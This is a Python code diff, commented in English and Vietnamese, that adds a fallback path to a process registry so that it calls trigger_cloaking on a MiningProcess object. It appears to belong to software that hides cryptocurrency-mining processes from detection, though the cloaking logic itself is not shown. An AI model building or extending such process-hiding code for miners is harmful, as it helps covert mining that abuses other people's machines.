@@ -993,12 +993,60 @@ class DirectPIDRegistry:
             })
             
             if write_success:
-                logger.info(f"📂 [FILE-FALLBACK] ResourceManager will discover and process PID {pid} via file scanner")
+                logger.info(f"📂 [FILE-FALLBACK] PID {pid} file written, attempting direct trigger_cloaking")
+                
+                # **CRITICAL FIX: Trigger cloaking directly since ResourceManager has no file scanner**
+                # (Sửa quan trọng: Gọi trigger_cloaking trực tiếp vì ResourceManager không có file scanner)
+                cloaking_triggered = False
+                
+                # **Try to trigger cloaking if we have ResourceManager instance** 
+                # (Thử kích hoạt cloaking nếu có instance ResourceManager)
+                if self._resource_manager:
+                    try:
+                        # Import MiningProcess class
+                        from mining_environment.scripts.resource_manager import MiningProcess
+                        
+                        # **Build metadata for cloaking** (xây dựng metadata cho cloaking)
+                        rm_metadata = _build_enhanced_metadata(coordinator_metadata, {
+                            'fallback_mode': True,
+                            'source': 'file_fallback_direct_trigger'
+                        })
+                        
+                        # **Create MiningProcess object** (tạo đối tượng MiningProcess)
+                        mining_process = MiningProcess(
+                            pid=pid,
+                            name=process_info.process_name,
+                            cmd=rm_metadata.get('cmd', [])
+                        )
+                        
+                        # **Trigger cloaking directly** (kích hoạt cloaking trực tiếp)
+                        if hasattr(self._resource_manager, 'trigger_cloaking'):
+                            logger.info(f"🎯 [FILE-FALLBACK] Triggering cloaking for PID {pid} via fallback")
+                            self._resource_manager.trigger_cloaking(mining_process, 'file_fallback_trigger')
+                            cloaking_triggered = True
+                            logger.info(f"✅ [FILE-FALLBACK] Cloaking triggered successfully for PID {pid}")
+                        
+                        # **Also try receive_from_registry as backup** (cũng thử receive_from_registry làm backup)
+                        if hasattr(self._resource_manager, 'receive_from_registry'):
+                            logger.info(f"📤 [FILE-FALLBACK] Also calling receive_from_registry for PID {pid}")
+                            self._resource_manager.receive_from_registry(pid, rm_metadata)
+                            
+                    except ImportError as ie:
+                        logger.warning(f"⚠️ [FILE-FALLBACK] Cannot import MiningProcess: {ie}")
+                    except Exception as e:
+                        logger.error(f"❌ [FILE-FALLBACK] Direct trigger_cloaking failed: {e}")
+                
+                # **Log final status** (ghi log trạng thái cuối)
+                if cloaking_triggered:
+                    logger.info(f"✅ [FILE-FALLBACK] Complete: PID {pid} file written + cloaking triggered")
+                else:
+                    logger.warning(f"⚠️ [FILE-FALLBACK] Partial: PID {pid} file written but cloaking NOT triggered (no RM scanner)")
                 
                 # **Update process coordination state** (cập nhật trạng thái coordination của process)
                 process_info.coordination_state = "file_fallback"
                 process_info.metadata['fallback_used'] = True
                 process_info.metadata['fallback_timestamp'] = time.time()
+                process_info.metadata['cloaking_triggered'] = cloaking_triggered
                 
                 # **Notify observers về fallback success** (thông báo observers về thành công fallback)
                 self._notify_observers(process_info)
